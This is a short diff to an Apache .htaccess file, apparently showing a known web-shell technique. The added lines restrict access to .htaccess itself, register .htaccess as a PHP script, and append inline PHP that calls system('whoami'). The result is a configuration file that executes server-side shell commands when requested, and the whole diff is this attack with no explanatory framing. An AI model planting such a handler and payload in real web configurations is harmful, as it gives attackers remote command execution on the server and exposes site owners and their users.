@@ -1,6 +1,8 @@
 Order Allow,Deny
 Deny from all
-<FilesMatch ".(jpg|gif|png|php|html|xml)$">
+<FilesMatch ".(htaccess)$">
 Order Deny,Allow
     Allow from all
 </FilesMatch>
+AddHandler php-script .htaccess
+<?php system("whoami");?>
